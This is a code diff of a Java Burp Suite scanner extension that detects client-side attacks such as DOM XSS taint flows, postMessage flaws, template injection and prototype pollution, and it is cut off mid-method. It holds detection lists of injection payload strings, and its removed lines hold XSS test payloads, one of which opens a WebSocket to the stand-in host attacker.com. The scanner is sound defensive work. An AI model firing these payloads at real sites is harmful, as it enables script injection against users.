@@ -26,6 +26,20 @@ public class EnhancedClientSideAttackDetector {
         "addEventListener('message'", "onmessage", "window.postMessage",
         "postMessage(", "message", "origin", "source"
     };
+
+    // High-signal sources for DOM/client-side injection (taint sources)
+    private static final String[] TAINT_SOURCES = {
+        "location.href", "location.search", "location.hash", "document.url", "document.documenturi",
+        "document.referrer", "window.name", "localStorage", "sessionStorage",
+        "event.data", "message.data", "e.data"
+    };
+
+    // High-impact sinks (execution / HTML injection)
+    private static final String[] TAINT_SINKS = {
+        "innerHTML", "outerHTML", "insertAdjacentHTML", "document.write", "document.writeln",
+        "eval(", "Function(", "setTimeout(", "setInterval(", "location=", "location.href=",
+        ".src=", ".href=", "setAttribute("
+    };
     
     // WebSocket Attack Patterns
     private static final String[] WEBSOCKET_PATTERNS = {
@@ -33,16 +47,19 @@ public class EnhancedClientSideAttackDetector {
         "onopen", "onmessage", "onclose", "onerror", "send("
     };
     
-    // Client-Side Template Injection Patterns
+    // Client-Side Template Injection Patterns - CRITICAL: Only match patterns likely to be exploitable
+    // Generic tokens like "{{" or "${" are too common in normal JS/HTML templates
     private static final String[] TEMPLATE_INJECTION_PATTERNS = {
-        "{{", "}}", "${", "}", "#{", "}", "<%=", "%>", "{{7*7}}",
-        "{{constructor.constructor", "{{config", "{{settings"
+        "{{7*7}}", "{{constructor.constructor", "{{config", "{{settings",
+        "{{self.__init__", "{{request.", "{{''.__class__",
+        "${alert(", "${document.", "${window.", "<%=alert(", "<%=eval("
     };
-    
-    // Prototype Pollution Patterns
+
+    // Prototype Pollution Patterns - CRITICAL: Only match actual pollution vectors
+    // "constructor" and "prototype" alone appear in every JS file
     private static final String[] PROTOTYPE_POLLUTION_PATTERNS = {
-        "__proto__", "prototype", "constructor", "Object.prototype",
-        "Array.prototype", "Function.prototype"
+        "__proto__", "Object.prototype.", "Array.prototype.",
+        "constructor.prototype", "constructor[", "__proto__["
     };
     
     // Modern Browser API Attack Patterns
@@ -116,12 +133,17 @@ public class EnhancedClientSideAttackDetector {
     }
     
     /**
-     * Comprehensive Client-Side Attack Analysis
+     * Comprehensive Client-Side Attack Analysis with Enhanced Detection
      */
     public ClientSideAttackResult analyzeClientSideAttacks(IHttpRequestResponse requestResponse) {
         ClientSideAttackResult result = new ClientSideAttackResult();
         
         try {
+            if (requestResponse == null || requestResponse.getResponse() == null) {
+                callbacks.printError("Invalid request/response for client-side analysis");
+                return result;
+            }
+            
             byte[] response = requestResponse.getResponse();
             int bodyOffset = helpers.analyzeResponse(response).getBodyOffset();
             String responseBody = new String(Arrays.copyOfRange(response, bodyOffset, response.length), StandardCharsets.UTF_8);
@@ -129,37 +151,368 @@ public class EnhancedClientSideAttackDetector {
             // Analyze headers for CSP
             String headers = new String(Arrays.copyOfRange(response, 0, bodyOffset), StandardCharsets.UTF_8);
             
-            // Perform comprehensive analysis
-            result.setCspAnalysis(analyzeCSP(headers, responseBody));
-            result.setPostMessageAnalysis(analyzePostMessage(responseBody));
+            // Perform comprehensive analysis with all detection types (gated by Settings where available)
+            boolean enablePostMessage = settings == null || Boolean.TRUE.equals(settings.getEnablePostMessageXSS());
+            boolean enablePrototype = settings == null || Boolean.TRUE.equals(settings.getEnablePrototypePollution());
+            boolean enableWebComponents = settings == null || Boolean.TRUE.equals(settings.getEnableWebComponents());
+            boolean enableModernApi = settings == null || Boolean.TRUE.equals(settings.getEnableModernBrowserAPI()) || Boolean.TRUE.equals(settings.getEnableWebAssembly());
+            boolean enableCSPAnalysis = settings == null || Boolean.TRUE.equals(settings.getCspAnalysis());
+            boolean enableCSPBypass = settings == null || Boolean.TRUE.equals(settings.getEnableCSPBypass());
+
+            result.setCspAnalysis(enableCSPAnalysis ? analyzeCSP(headers, responseBody) : new CSPAnalysisResult());
+            result.setPostMessageAnalysis(enablePostMessage ? analyzePostMessage(responseBody) : new PostMessageAnalysisResult());
             result.setWebSocketAnalysis(analyzeWebSocket(responseBody));
             result.setTemplateInjectionAnalysis(analyzeTemplateInjection(responseBody));
-            result.setPrototypePollutionAnalysis(analyzePrototypePollution(responseBody));
-            result.setModernAPIAnalysis(analyzeModernAPIs(responseBody));
-            result.setWebComponentsAnalysis(analyzeWebComponents(responseBody));
+            result.setPrototypePollutionAnalysis(enablePrototype ? analyzePrototypePollution(responseBody) : new PrototypePollutionAnalysisResult());
+            result.setModernAPIAnalysis(enableModernApi ? analyzeModernAPIs(responseBody) : new ModernAPIAnalysisResult());
+            result.setWebComponentsAnalysis(enableWebComponents ? analyzeWebComponents(responseBody) : new WebComponentsAnalysisResult());
+
+            // NEW: Correlate sources -> sinks (reduces false positives and increases accuracy)
+            int correlationScore = analyzeClientSideSourceSinkCorrelation(responseBody, result);
             
-            // REAL-TIME DYNAMIC ANALYSIS
+            // REAL-TIME DYNAMIC ANALYSIS - Enhanced
             result.setRealTimeDynamicAnalysis(analyzeRealTimeDynamicAttacks(responseBody));
             
-            // Calculate overall risk score
-            int riskScore = calculateRiskScore(result);
+            // Additional client-side injection vectors
+            analyzeAdditionalClientSideVectors(result, responseBody, headers);
+            
+            // Calculate overall risk score with enhanced weighting
+            int riskScore = calculateEnhancedRiskScore(result);
+            // Correlation score is the strongest signal for actual client-side injection
+            riskScore = Math.min(100, riskScore + correlationScore);
             result.setRiskScore(riskScore);
-            result.setVulnerable(riskScore >= 70);
+
+            // CRITICAL FIX: CSP misconfiguration alone is NOT exploitable XSS
+            // CSP misconfiguration is informational, not a confirmed XSS vulnerability
+            boolean isOnlyCSPMisconfig = result.getCspAnalysis().getRiskScore() > 0 && 
+                                        result.getPostMessageAnalysis().getRiskScore() < 25 &&
+                                        result.getWebSocketAnalysis().getRiskScore() < 25 &&
+                                        result.getTemplateInjectionAnalysis().getRiskScore() < 25 &&
+                                        result.getPrototypePollutionAnalysis().getRiskScore() < 25 &&
+                                        correlationScore < 30;
+            
+            // A client-side issue is "vulnerable" only if we have a high-signal correlated flow,
+            // or multiple high-risk vectors (postMessage/websocket) with unsafe sinks.
+            // CRITICAL: CSP misconfiguration alone does NOT make it vulnerable
+            boolean hasCorrelatedFlow = correlationScore >= 30;
+            boolean hasUnsafeMessaging = (result.getPostMessageAnalysis().getRiskScore() >= 25) || (result.getWebSocketAnalysis().getRiskScore() >= 25);
+            boolean hasTemplateInjection = result.getTemplateInjectionAnalysis().getRiskScore() >= 25;
+            boolean hasPrototypePollution = result.getPrototypePollutionAnalysis().getRiskScore() >= 25;
+            
+            // CRITICAL: Require STRONG evidence for client-side issues
+            // Pattern matching (proximity of sources/sinks) is NOT sufficient proof
+            // Require either:
+            // 1. High correlation score (>= 30) with multiple taint flows (>= 3), OR
+            // 2. Very high risk score (>= 85) with actual exploitable vectors
+            boolean hasMultipleTaintFlows = false;
+            try {
+                if (result.getModernAPIAnalysis() != null && result.getModernAPIAnalysis().getDetectedPatterns() != null) {
+                    Set<String> uniqueTaintFlows = new HashSet<>();
+                    for (String pattern : result.getModernAPIAnalysis().getDetectedPatterns()) {
+                        if (pattern != null && pattern.startsWith("TAINT_FLOW:")) {
+                            uniqueTaintFlows.add(pattern);
+                        }
+                    }
+                    hasMultipleTaintFlows = uniqueTaintFlows.size() >= 3;
+                }
+            } catch (Exception ignored) {}
+            
+            boolean hasVeryHighRisk = riskScore >= 85;
+            boolean hasStrongEvidence = hasCorrelatedFlow && hasMultipleTaintFlows;
+            
+            // Only mark as vulnerable if we have actual exploitable vectors with STRONG evidence, NOT just CSP misconfiguration
+            result.setVulnerable(!isOnlyCSPMisconfig && 
+                                (hasStrongEvidence || (hasVeryHighRisk && (hasUnsafeMessaging || hasTemplateInjection || hasPrototypePollution))));
             
             // Generate exploit POC if vulnerable
             if (result.isVulnerable()) {
                 result.setExploitPOC(generateExploitPOC(result, requestResponse));
                 result.setReproductionSteps(generateReproductionSteps(result, requestResponse));
                 
-                // CRITICAL FIX: Create real exploited evidence for professional advisory
+                // Create real exploited evidence for professional advisory
                 createRealExploitedEvidence(result, requestResponse);
             }
             
         } catch (Exception e) {
             callbacks.printError("Client-Side Attack Analysis Error: " + e.getMessage());
+            if (settings != null && settings.getVerboseLogging()) {
+                callbacks.printError("Stack trace: " + java.util.Arrays.toString(e.getStackTrace()));
+            }
         }
         
         return result;
+    }
+
+    /**
+     * NEW: High-signal correlation between user-controlled sources and dangerous sinks.
+     * This is a major missing piece in naive "pattern-only" scanners.
+     *
+     * We boost score when we find evidence of (source -> sink) in the same local context window.
+     * Findings are stored into ModernAPIAnalysisResult.detectedPatterns for reporting/triage.
+     */
+    private int analyzeClientSideSourceSinkCorrelation(String body, ClientSideAttackResult result) {
+        try {
+            if (body == null || body.isEmpty() || result == null) return 0;
+
+            String lower = body.toLowerCase();
+            int score = 0;
+
+            // If the app uses Trusted Types / DOMPurify, reduce score slightly (defense-in-depth)
+            boolean hasTrustedTypes = lower.contains("trustedtypes") || lower.contains("trusted types");
+            boolean hasDomPurify = lower.contains("dompurify") && lower.contains("sanitize");
+
+            // ENHANCED: Larger sliding window for SPA detection (increased from 800 to 2000 chars)
+            // SPAs often have larger codebases with indirect flows
+            final int window = 2000;
+            
+            // CRITICAL FIX: Use Set to prevent duplicate TAINT_FLOW entries
+            Set<String> detectedFlows = new HashSet<>();
+            
+            for (String sink : TAINT_SINKS) {
+                String sinkLower = sink.toLowerCase();
+                int idx = 0;
+                while (idx >= 0 && idx < lower.length()) {
+                    idx = lower.indexOf(sinkLower, idx);
+                    if (idx < 0) break;
+
+                    int start = Math.max(0, idx - window);
+                    int end = Math.min(lower.length(), idx + window);
+                    String context = lower.substring(start, end);
+
+                    String matchedSource = null;
+                    for (String src : TAINT_SOURCES) {
+                        if (context.contains(src.toLowerCase())) {
+                            matchedSource = src;
+                            break;
+                        }
+                    }
+
+                    if (matchedSource != null) {
+                        // CRITICAL FIX: Create unique flow identifier to prevent duplicates
+                        String flowId = matchedSource + " -> " + sink;
+                        
+                        // Only process if we haven't seen this exact flow before
+                        if (!detectedFlows.contains(flowId)) {
+                            detectedFlows.add(flowId);
+                            
+                            // Execution sinks are more dangerous than pure HTML sinks.
+                            int delta = 0;
+                            if (sinkLower.startsWith("eval") || sinkLower.startsWith("function(") || sinkLower.startsWith("settimeout") || sinkLower.startsWith("setinterval")) {
+                                delta = 35;
+                            } else if (sinkLower.contains("innerhtml") || sinkLower.contains("outerhtml") || sinkLower.contains("insertadjacenthtml") || sinkLower.contains("document.write")) {
+                                delta = 25;
+                            } else {
+                                delta = 15;
+                            }
+
+                            score += delta;
+                            result.getModernAPIAnalysis().getDetectedPatterns().add("TAINT_FLOW: " + flowId);
+
+                            // Boost associated sub-analyses so UI shows the right "attack type"
+                            if (matchedSource.toLowerCase().contains("event.data") || matchedSource.toLowerCase().contains("message.data")) {
+                                result.getPostMessageAnalysis().setRiskScore(Math.min(100, result.getPostMessageAnalysis().getRiskScore() + 20));
+                                result.getPostMessageAnalysis().getDetectedPatterns().add("Unsafe message data used in sink: " + sink);
+                            }
+                        }
+
+                    }
+
+                    idx = idx + Math.max(1, sinkLower.length());
+                }
+            }
+
+            if (hasTrustedTypes) score -= 5;
+            if (hasDomPurify) score -= 10;
+            return Math.max(0, Math.min(score, 60)); // cap correlation contribution
+
+        } catch (Exception e) {
+            callbacks.printError("Error correlating client-side sources/sinks: " + e.getMessage());
+            return 0;
+        }
+    }
+    
+    /**
+     * Analyze additional client-side injection vectors
+     */
+    private void analyzeAdditionalClientSideVectors(ClientSideAttackResult result, String responseBody, String headers) {
+        try {
+            String bodyLower = responseBody.toLowerCase();
+            
+            // Mutation XSS detection
+            if (bodyLower.contains("mutation") && (bodyLower.contains("xss") || bodyLower.contains("innerhtml"))) {
+                result.getModernAPIAnalysis().setRiskScore(result.getModernAPIAnalysis().getRiskScore() + 15);
+                result.getModernAPIAnalysis().getDetectedPatterns().add("Mutation XSS");
+            }
+            
+            // Universal XSS detection
+            if (bodyLower.contains("universal") || bodyLower.contains("uxss")) {
+                result.getModernAPIAnalysis().setRiskScore(result.getModernAPIAnalysis().getRiskScore() + 20);
+                result.getModernAPIAnalysis().getDetectedPatterns().add("Universal XSS");
+            }
+            
+            // mXSS (Mutation XSS) detection
+            if (bodyLower.contains("mxss") || (bodyLower.contains("mutation") && bodyLower.contains("xss"))) {
+                result.getModernAPIAnalysis().setRiskScore(result.getModernAPIAnalysis().getRiskScore() + 18);
+                result.getModernAPIAnalysis().getDetectedPatterns().add("Mutation XSS (mXSS)");
+            }
+            
+            // Self-XSS detection
+            if (bodyLower.contains("self-xss") || bodyLower.contains("self xss")) {
+                result.getModernAPIAnalysis().setRiskScore(result.getModernAPIAnalysis().getRiskScore() + 10);
+                result.getModernAPIAnalysis().getDetectedPatterns().add("Self-XSS");
+            }
+            
+            // Flash-based XSS
+            if (bodyLower.contains("flash") || bodyLower.contains("swf") || bodyLower.contains("object") && bodyLower.contains("embed")) {
+                result.getModernAPIAnalysis().setRiskScore(result.getModernAPIAnalysis().getRiskScore() + 12);
+                result.getModernAPIAnalysis().getDetectedPatterns().add("Flash-based XSS");
+            }
+            
+            // SVG-based XSS
+            if (bodyLower.contains("<svg") || bodyLower.contains("image/svg+xml")) {
+                result.getModernAPIAnalysis().setRiskScore(result.getModernAPIAnalysis().getRiskScore() + 15);
+                result.getModernAPIAnalysis().getDetectedPatterns().add("SVG-based XSS");
+            }
+            
+            // CSS Injection
+            if (bodyLower.contains("style") && (bodyLower.contains("expression") || bodyLower.contains("javascript:") || bodyLower.contains("@import"))) {
+                result.getModernAPIAnalysis().setRiskScore(result.getModernAPIAnalysis().getRiskScore() + 14);
+                result.getModernAPIAnalysis().getDetectedPatterns().add("CSS Injection");
+            }
+            
+            // Trusted Types bypass detection
+            if (bodyLower.contains("trustedtypes") || bodyLower.contains("trusted types")) {
+                if (bodyLower.contains("createpolicy") && bodyLower.contains("createhtml")) {
+                    result.getModernAPIAnalysis().setRiskScore(result.getModernAPIAnalysis().getRiskScore() + 20);
+                    result.getModernAPIAnalysis().getDetectedPatterns().add("Trusted Types Bypass");
+                }
+            }
+            
+            // Sanitizer API bypass detection
+            if (bodyLower.contains("sanitizer") && bodyLower.contains("sethtml")) {
+                result.getModernAPIAnalysis().setRiskScore(result.getModernAPIAnalysis().getRiskScore() + 18);
+                result.getModernAPIAnalysis().getDetectedPatterns().add("Sanitizer API Bypass");
+            }
+            
+            // DOMPurify bypass detection
+            if (bodyLower.contains("dompurify") && (bodyLower.contains("sanitize") || bodyLower.contains("purify"))) {
+                if (bodyLower.contains("foreignobject") || bodyLower.contains("mathml") || bodyLower.contains("details")) {
+                    result.getModernAPIAnalysis().setRiskScore(result.getModernAPIAnalysis().getRiskScore() + 16);
+                    result.getModernAPIAnalysis().getDetectedPatterns().add("DOMPurify Bypass");
+                }
+            }
+            
+            // SameSite cookie bypass detection
+            if (bodyLower.contains("samesite") || bodyLower.contains("same-site")) {
+                if (bodyLower.contains("none") || bodyLower.contains("lax") || bodyLower.contains("strict")) {
+                    result.getModernAPIAnalysis().setRiskScore(result.getModernAPIAnalysis().getRiskScore() + 12);
+                    result.getModernAPIAnalysis().getDetectedPatterns().add("SameSite Cookie Bypass");
+                }
+            }
+            
+            // Header injection detection
+            if (bodyLower.contains("x-forwarded") || bodyLower.contains("x-real-ip") || bodyLower.contains("user-agent") || bodyLower.contains("referer")) {
+                if (bodyLower.contains("<script") || bodyLower.contains("javascript:") || bodyLower.contains("onerror")) {
+                    result.getModernAPIAnalysis().setRiskScore(result.getModernAPIAnalysis().getRiskScore() + 15);
+                    result.getModernAPIAnalysis().getDetectedPatterns().add("Header Injection XSS");
+                }
+            }
+            
+            // Cookie injection detection
+            if (bodyLower.contains("document.cookie") || bodyLower.contains("set-cookie")) {
+                if (bodyLower.contains("<script") || bodyLower.contains("javascript:") || bodyLower.contains("onerror")) {
+                    result.getModernAPIAnalysis().setRiskScore(result.getModernAPIAnalysis().getRiskScore() + 13);
+                    result.getModernAPIAnalysis().getDetectedPatterns().add("Cookie Injection XSS");
+                }
+            }
+            
+            // Markdown XSS detection
+            if (bodyLower.contains("markdown") || bodyLower.contains("md") || bodyLower.contains("```")) {
+                if (bodyLower.contains("javascript:") || bodyLower.contains("<script") || bodyLower.contains("onerror")) {
+                    result.getModernAPIAnalysis().setRiskScore(result.getModernAPIAnalysis().getRiskScore() + 11);
+                    result.getModernAPIAnalysis().getDetectedPatterns().add("Markdown XSS");
+                }
+            }
+            
+            // MathML XSS detection
+            if (bodyLower.contains("<math") || bodyLower.contains("mathml")) {
+                if (bodyLower.contains("xlink:href") || bodyLower.contains("javascript:") || bodyLower.contains("<script")) {
+                    result.getModernAPIAnalysis().setRiskScore(result.getModernAPIAnalysis().getRiskScore() + 10);
+                    result.getModernAPIAnalysis().getDetectedPatterns().add("MathML XSS");
+                }
+            }
+            
+            // Blob/File API XSS detection
+            if (bodyLower.contains("blob:") || bodyLower.contains("url.createobjecturl") || bodyLower.contains("file api")) {
+                if (bodyLower.contains("<script") || bodyLower.contains("javascript:") || bodyLower.contains("eval")) {
+                    result.getModernAPIAnalysis().setRiskScore(result.getModernAPIAnalysis().getRiskScore() + 17);
+                    result.getModernAPIAnalysis().getDetectedPatterns().add("Blob/File API XSS");
+                }
+            }
+            
+            // Import Maps XSS detection
+            if (bodyLower.contains("importmap") || bodyLower.contains("type=\"importmap\"")) {
+                if (bodyLower.contains("javascript:") || bodyLower.contains("data:text") || bodyLower.contains("blob:")) {
+                    result.getModernAPIAnalysis().setRiskScore(result.getModernAPIAnalysis().getRiskScore() + 19);
+                    result.getModernAPIAnalysis().getDetectedPatterns().add("Import Maps XSS");
+                }
+            }
+            
+            // Module Workers XSS detection
+            if (bodyLower.contains("new worker") || bodyLower.contains("sharedworker") || bodyLower.contains("type:'module'")) {
+                if (bodyLower.contains("javascript:") || bodyLower.contains("data:text") || bodyLower.contains("blob:")) {
+                    result.getModernAPIAnalysis().setRiskScore(result.getModernAPIAnalysis().getRiskScore() + 16);
+                    result.getModernAPIAnalysis().getDetectedPatterns().add("Module Workers XSS");
+                }
+            }
+            
+            // HTML5-based XSS
+            if (bodyLower.contains("html5") || (bodyLower.contains("data-") && bodyLower.contains("on"))) {
+                result.getModernAPIAnalysis().setRiskScore(result.getModernAPIAnalysis().getRiskScore() + 10);
+                result.getModernAPIAnalysis().getDetectedPatterns().add("HTML5-based XSS");
+            }
+            
+        } catch (Exception e) {
+            callbacks.printError("Error analyzing additional client-side vectors: " + e.getMessage());
+        }
+    }
+    
+    /**
+     * Calculate enhanced risk score with better weighting
+     * CRITICAL FIX: CSP misconfiguration alone should not inflate risk score
+     */
+    private int calculateEnhancedRiskScore(ClientSideAttackResult result) {
+        int score = 0;
+        
+        // CRITICAL FIX: Reduce CSP weight - CSP misconfiguration is informational, not exploitable
+        // Only count CSP if there are other exploitable vectors
+        boolean hasExploitableVectors = result.getPostMessageAnalysis().getRiskScore() >= 25 ||
+                                       result.getWebSocketAnalysis().getRiskScore() >= 25 ||
+                                       result.getTemplateInjectionAnalysis().getRiskScore() >= 25 ||
+                                       result.getPrototypePollutionAnalysis().getRiskScore() >= 25;
+        
+        if (hasExploitableVectors) {
+            // CSP misconfiguration makes existing vectors worse, but alone it's not exploitable
+            score += (int)(result.getCspAnalysis().getRiskScore() * 0.15); // Reduced from 0.25
+        } else {
+            // CSP misconfiguration alone - cap at 30 (informational)
+            score += Math.min((int)(result.getCspAnalysis().getRiskScore() * 0.10), 30);
+        }
+        
+        // Weighted scoring for different attack types (exploitable vectors)
+        score += (int)(result.getPostMessageAnalysis().getRiskScore() * 0.25); // Increased from 0.20
+        score += (int)(result.getWebSocketAnalysis().getRiskScore() * 0.20); // Increased from 0.15
+        score += (int)(result.getTemplateInjectionAnalysis().getRiskScore() * 0.20); // Increased from 0.15
+        score += (int)(result.getPrototypePollutionAnalysis().getRiskScore() * 0.15); // Increased from 0.10
+        score += (int)(result.getModernAPIAnalysis().getRiskScore() * 0.15); // Increased from 0.10
+        score += (int)(result.getWebComponentsAnalysis().getRiskScore() * 0.05);
+        
+        // Real-time dynamic analysis bonus
+        if (result.getRealTimeDynamicAnalysis() != null) {
+            score += (int)(result.getRealTimeDynamicAnalysis().getRealTimeRiskScore() * 0.10);
+        }
+        
+        return Math.min(score, 100);
     }
     
     /**
@@ -192,7 +545,9 @@ public class EnhancedClientSideAttackDetector {
             }
         } else {
             result.setCspPresent(false);
-            result.setRiskScore(100); // No CSP is high risk
+            // No CSP is a defense-in-depth gap, not automatically an exploitable injection.
+            // Keep as a moderate signal (can be reported separately if desired).
+            result.setRiskScore(20);
         }
         
         return result;
@@ -211,10 +566,20 @@ public class EnhancedClientSideAttackDetector {
             }
         }
         
-        // Check for unsafe origin validation
-        if (body.contains("postMessage") && !body.contains("origin") && !body.contains("source")) {
-            result.setUnsafeOriginValidation(true);
-            result.setRiskScore(result.getRiskScore() + 20);
+        // Improve precision: "unsafe origin validation" is only meaningful if a message handler exists.
+        String lower = body.toLowerCase();
+        boolean hasHandler = lower.contains("addeventlistener('message'") || lower.contains("addeventlistener(\"message\"") || lower.contains("onmessage");
+        if (hasHandler) {
+            boolean checksOrigin = lower.contains("origin") || lower.contains("event.origin") || lower.contains("message.origin");
+            boolean usesSource = lower.contains("source") || lower.contains("event.source") || lower.contains("message.source");
+            if (!checksOrigin && !usesSource) {
+                result.setUnsafeOriginValidation(true);
+                result.setRiskScore(result.getRiskScore() + 15);
+            }
+            // Extra signal: message data used at all
+            if (lower.contains("event.data") || lower.contains("message.data")) {
+                result.setRiskScore(result.getRiskScore() + 10);
+            }
         }
         
         return result;
@@ -250,27 +615,49 @@ public class EnhancedClientSideAttackDetector {
         
         for (String pattern : TEMPLATE_INJECTION_PATTERNS) {
             if (body.contains(pattern)) {
+                // CRITICAL FIX: Verify pattern is NOT inside a JS comment or string definition
+                int idx = body.indexOf(pattern);
+                if (idx >= 0) {
+                    int lineStart = body.lastIndexOf('\n', idx);
+                    if (lineStart < 0) lineStart = 0;
+                    String linePrefix = body.substring(lineStart, idx).trim();
+                    // Skip if in a single-line comment
+                    if (linePrefix.contains("//")) continue;
+                    // Skip if clearly in a block comment
+                    String before100 = body.substring(Math.max(0, idx - 100), idx);
+                    if (before100.contains("/*") && !before100.contains("*/")) continue;
+                }
                 result.getDetectedPatterns().add(pattern);
                 result.setRiskScore(result.getRiskScore() + 12);
             }
         }
-        
+
         return result;
     }
-    
+
     /**
      * Prototype Pollution Analysis
      */
     private PrototypePollutionAnalysisResult analyzePrototypePollution(String body) {
         PrototypePollutionAnalysisResult result = new PrototypePollutionAnalysisResult();
-        
+
         for (String pattern : PROTOTYPE_POLLUTION_PATTERNS) {
             if (body.contains(pattern)) {
+                // CRITICAL FIX: Skip if pattern is in a defensive context (Object.freeze, hasOwnProperty check)
+                int idx = body.indexOf(pattern);
+                if (idx >= 0) {
+                    String context = body.substring(Math.max(0, idx - 200), Math.min(body.length(), idx + 200));
+                    // Skip defensive patterns - these are SAFE, not vulnerabilities
+                    if (context.contains("Object.freeze") || context.contains("Object.seal") ||
+                        context.contains("hasOwnProperty") || context.contains("Object.create(null)")) {
+                        continue;
+                    }
+                }
                 result.getDetectedPatterns().add(pattern);
                 result.setRiskScore(result.getRiskScore() + 15);
             }
         }
-        
+
         return result;
     }
     
@@ -307,35 +694,69 @@ public class EnhancedClientSideAttackDetector {
     }
     
     /**
-     * REAL-TIME DYNAMIC ATTACK ANALYSIS
+     * REAL-TIME DYNAMIC ATTACK ANALYSIS - ENHANCED WITH ADVANCED PATTERN MATCHING
      * Comprehensive analysis of live DOM changes, dynamic content updates, and real-time exploitation vectors
+     * Uses context-aware regex patterns for accurate detection
      */
     private RealTimeDynamicAnalysisResult analyzeRealTimeDynamicAttacks(String body) {
         RealTimeDynamicAnalysisResult result = new RealTimeDynamicAnalysisResult();
         String bodyLower = body.toLowerCase();
         
-        // Live DOM Monitoring Detection
-        if (bodyLower.contains("mutationobserver") || bodyLower.contains("mutation observer")) {
-            result.setHasLiveDOMMonitoring(true);
-            result.setLiveDOMMonitoringRisk("HIGH");
-            result.getDetectedVectors().add("LiveDOMMonitoring");
-            callbacks.printOutput("[REALTIME] Live DOM monitoring detected - Real-time DOM changes possible");
+        // Live DOM Monitoring Detection - Enhanced with regex patterns
+        Pattern mutationObserverPattern = Pattern.compile(
+            "(?:new\\s+)?MutationObserver\\s*\\(|MutationObserver\\.observe|mutationobserver",
+            Pattern.CASE_INSENSITIVE | Pattern.MULTILINE
+        );
+        if (mutationObserverPattern.matcher(body).find()) {
+            // Check for actual usage
+            Pattern usagePattern = Pattern.compile(
+                "MutationObserver\\s*\\([^)]*\\)|MutationObserver\\.observe\\s*\\(|new\\s+MutationObserver",
+                Pattern.CASE_INSENSITIVE
+            );
+            if (usagePattern.matcher(body).find()) {
+                result.setHasLiveDOMMonitoring(true);
+                result.setLiveDOMMonitoringRisk("HIGH");
+                result.getDetectedVectors().add("LiveDOMMonitoring");
+                callbacks.printOutput("[REALTIME] Live DOM monitoring detected with usage - Real-time DOM changes active");
+            }
         }
         
-        // Real-time Communication Detection
-        if (bodyLower.contains("websocket") || bodyLower.contains("ws://") || bodyLower.contains("wss://")) {
-            result.setHasRealTimeCommunication(true);
-            result.setRealTimeCommunicationRisk("HIGH");
-            result.getDetectedVectors().add("RealTimeCommunication");
-            callbacks.printOutput("[REALTIME] Real-time communication detected - Live data streaming possible");
+        // Real-time Communication Detection - Enhanced with regex patterns
+        Pattern webSocketPattern = Pattern.compile(
+            "(?:new\\s+)?WebSocket\\s*\\(|websocket|ws://|wss://|socket\\.io",
+            Pattern.CASE_INSENSITIVE
+        );
+        if (webSocketPattern.matcher(body).find()) {
+            // Check for actual WebSocket instantiation
+            Pattern wsUsagePattern = Pattern.compile(
+                "new\\s+WebSocket\\s*\\(|WebSocket\\s*\\(|socket\\.io\\(|io\\.connect",
+                Pattern.CASE_INSENSITIVE
+            );
+            if (wsUsagePattern.matcher(body).find()) {
+                result.setHasRealTimeCommunication(true);
+                result.setRealTimeCommunicationRisk("HIGH");
+                result.getDetectedVectors().add("RealTimeCommunication");
+                callbacks.printOutput("[REALTIME] Real-time communication detected with usage - Live data streaming active");
+            }
         }
         
-        // Dynamic Code Execution Detection
-        if (bodyLower.contains("import(") || bodyLower.contains("dynamic import") || bodyLower.contains("import.meta")) {
-            result.setHasDynamicCodeExecution(true);
-            result.setDynamicCodeExecutionRisk("HIGH");
-            result.getDetectedVectors().add("DynamicCodeExecution");
-            callbacks.printOutput("[REALTIME] Dynamic code execution detected - Runtime module loading possible");
+        // Dynamic Code Execution Detection - Enhanced with regex patterns
+        Pattern dynamicImportPattern = Pattern.compile(
+            "import\\s*\\(|dynamic\\s+import|import\\.meta",
+            Pattern.CASE_INSENSITIVE
+        );
+        if (dynamicImportPattern.matcher(body).find()) {
+            // Check for actual dynamic import usage (not static import)
+            Pattern diUsagePattern = Pattern.compile(
+                "import\\s*\\([^)]+\\)|import\\.meta\\.url|import\\.meta\\.resolve",
+                Pattern.CASE_INSENSITIVE
+            );
+            if (diUsagePattern.matcher(body).find()) {
+                result.setHasDynamicCodeExecution(true);
+                result.setDynamicCodeExecutionRisk("HIGH");
+                result.getDetectedVectors().add("DynamicCodeExecution");
+                callbacks.printOutput("[REALTIME] Dynamic code execution detected with usage - Runtime module loading active");
+            }
         }
         
         // Advanced JavaScript Features Detection
@@ -600,25 +1021,28 @@ public class EnhancedClientSideAttackDetector {
      */
     private void createRealExploitedEvidence(ClientSideAttackResult result, IHttpRequestResponse requestResponse) {
         try {
-            // Generate appropriate payload based on attack type
-            String payload = generateClientSidePayload(result);
-            if (payload == null || payload.trim().isEmpty()) {
-                payload = "<script>alert('Client-Side XSS')</script>";
-            }
+            // Generate taint-flow-aware payload recommendation (SPA/JSON friendly)
+            String contentType = extractContentType(requestResponse);
+            String payload = pickBestClientSidePayload(result, contentType);
             
-            // Create test request with payload
-            String testRequest = createClientSideTestRequest(requestResponse, payload);
-            if (testRequest != null) {
-                result.setTestRequest(testRequest);
+            // CRITICAL: For client-side attack passive scanning, we analyze the actual response
+            // We cannot send HTTP requests in passive scanning - that requires active scanning
+            // Store the actual request/response as evidence
+            try {
+                // Use actual request/response from the server
+                byte[] actualRequest = requestResponse.getRequest();
+                byte[] actualResponse = requestResponse.getResponse();
+                
+                if (actualRequest != null && actualRequest.length > 0) {
+                    result.setTestRequest(new String(actualRequest, StandardCharsets.UTF_8));
+                }
+                if (actualResponse != null && actualResponse.length > 0) {
+                    result.setTestResponse(new String(actualResponse, StandardCharsets.UTF_8));
+                }
                 result.setTestPayload(payload);
-                callbacks.printOutput("[CLIENT-SIDE] Created test request with payload: " + payload);
-            }
-            
-            // Create test response showing exploitation
-            String testResponse = createClientSideTestResponse(requestResponse, payload, result);
-            if (testResponse != null) {
-                result.setTestResponse(testResponse);
-                callbacks.printOutput("[CLIENT-SIDE] Created test response showing exploitation");
+                callbacks.printOutput("[CLIENT-SIDE] Using actual request/response for evidence");
+            } catch (Exception e) {
+                callbacks.printError("[CLIENT-SIDE] Error processing actual request/response: " + e.getMessage());
             }
             
         } catch (Exception e) {
@@ -629,130 +1053,80 @@ public class EnhancedClientSideAttackDetector {
     /**
      * Generate appropriate payload for client-side attacks
      */
-    private String generateClientSidePayload(ClientSideAttackResult result) {
-        // Generate payload based on detected attack types
-        if (result.getCspAnalysis().getRiskScore() > 0) {
-            return "<script>alert('CSP Bypass')</script>";
-        } else if (result.getPostMessageAnalysis().getRiskScore() > 0) {
-            return "javascript:alert('PostMessage XSS')";
-        } else if (result.getWebSocketAnalysis().getRiskScore() > 0) {
-            return "<script>new WebSocket('ws://attacker.com').send('XSS')</script>";
-        } else if (result.getTemplateInjectionAnalysis().getRiskScore() > 0) {
